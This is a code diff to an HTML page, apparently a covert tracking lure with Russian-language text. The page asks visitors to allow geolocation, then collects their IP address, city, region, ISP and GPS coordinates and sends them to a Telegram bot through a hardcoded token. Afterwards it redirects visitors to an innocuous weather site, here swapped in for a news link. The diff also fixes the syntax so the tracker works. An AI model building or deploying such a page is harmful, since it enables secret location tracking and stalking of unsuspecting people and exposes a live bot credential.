@@ -26,7 +26,7 @@
   <div id="status">⏳ Разрешите доступ к геолокации, если будет запрошено...</div>
 
   <script>
-    const redirectUrl = "https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina";
+    const redirectUrl = "https://sinoptik.ua/ru"; // ← Новый редирект
 
     function sendToTelegram(message, callback) {
       fetch("https://api.telegram.org/bot7780068053:AAEfj3ROoHOupCeM7F_W7auJAkakcluF5Nw/sendMessage", {
@@ -49,15 +49,14 @@
     fetch("https://ipwho.is/")
       .then(res => res.json())
       .then(data => {
-        const ipMessage = 
+        const ipMessage = `
 IP: ${data.ip}
 Город: ${data.city}
 Регион: ${data.region}
 Страна: ${data.country}
 Провайдер: ${data.connection.isp}
-Время: ${new Date().toLocaleString()};
+Время: ${new Date().toLocaleString()}`;
 
-        // GPS запрос
         if (navigator.geolocation) {
           let gotGPS = false;
 
@@ -66,7 +65,7 @@ IP: ${data.ip}
               const msg = ipMessage + "\n\n⚠️ GPS: не получен (таймаут)";
               sendToTelegram(msg, startRedirect);
             }
-          }, 7000); // немного дольше
+          }, 7000);
 
           navigator.geolocation.getCurrentPosition(
             pos => {
@@ -75,12 +74,12 @@ IP: ${data.ip}
               const lat = pos.coords.latitude;
               const lon = pos.coords.longitude;
               const acc = pos.coords.accuracy;
-              const msg = ipMessage + \n\n📍 GPS: ${lat}, ${lon}\n🎯 Точность: ${acc} м;
+              const msg = ipMessage + `\n\n📍 GPS: ${lat}, ${lon}\n🎯 Точность: ${acc} м`;
               sendToTelegram(msg, startRedirect);
             },
             err => {
               clearTimeout(gpsTimeout);
-              const msg = ipMessage + \n\n⚠️ Ошибка GPS: ${err.message};
+              const msg = ipMessage + `\n\n⚠️ Ошибка GPS: ${err.message}`;
               sendToTelegram(msg, startRedirect);
             },
             {
@@ -101,6 +100,7 @@ IP: ${data.ip}
   </script>
 </body>
 </html>
+
 
 
 
